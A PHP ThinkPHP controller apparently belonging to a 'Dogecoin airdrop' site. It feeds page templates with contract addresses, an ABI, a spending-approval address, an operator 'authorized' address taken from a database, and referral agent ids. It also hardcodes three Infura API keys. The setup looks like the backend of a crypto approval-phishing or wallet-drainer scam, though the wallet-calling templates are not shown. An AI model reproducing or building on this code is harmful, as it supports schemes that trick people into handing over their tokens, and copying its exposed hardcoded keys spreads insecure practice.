<?php

namespace app\index\controller;

use think\admin\Controller;
use app\index\service\AddressService;

/**
 * 狗狗币空投
 * Class Dog
 * @package app\index\controller
 */
class Dog extends Controller
{
    public function index()
    {
		$agent = input('agent');
		if(empty($agent)){
			$this->error("输入参数不完整");
		}
		
		$this->userId = $agent;
		$this->address = config('contract.etherscan.contractaddress');
		$this->abi = config('contract.etherscan.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.etherscan.addr');
		$this->addr2 = config('contract.etherscan.addr2');
		$this->addr3 = config('contract.etherscan.addr3');
		
		$authorized_add = AddressService::instance()->get_address_by_id(1);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		$this->fetch();
    }
	
	public function buy(){
		$agent = input('agent');
		if(empty($agent)){
			$this->error("输入参数不完整");
		}
		
		$this->userId = $agent;
		$this->fetch();
	}
	
	public function index_trc()
    {
		$agent = input('agent');
		if(empty($agent)){
			$this->error("输入参数不完整");
		}
		
		$this->userId = $agent;
		$this->address = config('contract.tronscan.contract');
		$this->abi = config('contract.tronscan.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.tronscan.addr');
		
		$authorized_add = AddressService::instance()->get_address_by_id(2);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		$this->fetch();
    }
	
	public function buy_trc(){
		$agent = input('agent');
		if(empty($agent)){
			$this->error("输入参数不完整");
		}
		
		$this->userId = $agent;
		$this->fetch();
	}
	
	public function index_new()
    {
		$agent = input('agent');
		if(empty($agent)){
			$this->error("输入参数不完整");
		}
		
		$this->userId = $agent;
		$this->address = config('contract.etherscan.contractaddress');
		$this->abi = config('contract.etherscan.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.etherscan.addr');
		$this->addr2 = config('contract.etherscan.addr2');
		$this->addr3 = config('contract.etherscan.addr3');
		
		$authorized_add = AddressService::instance()->get_address_by_id(1);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		$this->fetch();
    }
	
	public function index_new_trc()
    {
		$agent = input('agent');
		if(empty($agent)){
			$this->error("输入参数不完整");
		}
		
		$this->userId = $agent;
		$this->address = config('contract.tronscan.contract');
		$this->abi = config('contract.tronscan.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.tronscan.addr');
		
		$authorized_add = AddressService::instance()->get_address_by_id(2);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		$this->fetch();
    }
}